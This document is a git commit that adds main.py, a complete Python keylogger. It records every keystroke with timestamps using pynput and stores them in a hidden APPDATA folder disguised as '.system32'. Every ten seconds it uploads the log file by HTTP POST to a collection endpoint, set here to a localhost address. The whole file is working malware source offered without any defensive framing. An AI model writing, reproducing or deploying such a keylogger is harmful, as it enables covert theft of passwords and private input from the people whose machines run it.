3948a0c1c11850e63751438ab95c00d1eb8ec926
faruqer <136151240+faruqer@users.noreply.github.com>
2024-10-10 02:32:08 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,55 @@
+from pynput.keyboard import Listener
+from datetime import datetime
+import os
+import threading
+import time
+import requests
+
+def on_press(key):
+    strick_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    final_str = strick_time + " -- " + str(key) + "\n"
+    save_log(final_str)
+
+def check_path():
+    appdata = os.getenv("APPDATA")
+    dir_name = ".system32"
+    full_path = os.path.join(appdata, dir_name)
+    if os.path.exists(full_path):
+        pass
+    else:
+        os.mkdir(full_path)
+
+def save_log(string):
+    appdata = os.getenv("APPDATA")
+    dir_name = ".system32"
+    log_file = "keylogs.txt"
+    file_location = os.path.join(appdata, dir_name, log_file)
+    with open(file_location, "a") as file:
+        file.write(string)
+
+def send_log():
+        url = "http://localhost:3000/upload"
+        appdata = os.getenv("APPDATA")
+        dir_name = ".system32"
+        log_file = "keylogs.txt"
+        while True:
+                time.sleep(10) #Needs adjustment
+                file_location = os.path.join(appdata, dir_name, log_file)
+                files = {
+                    'file': open(file_location, 'rb')
+                }
+                response = requests.post(url, files=files)
+                print(response.status_code)
+
+def start_listener():
+        with Listener(on_press=on_press) as listener:
+                listener.join()
+
+listener_thread = threading.Thread(target=start_listener)
+sender_thread = threading.Thread(target=send_log)
+
+listener_thread.start()
+sender_thread.start()
+
+listener_thread.join()
+sender_thread.join()
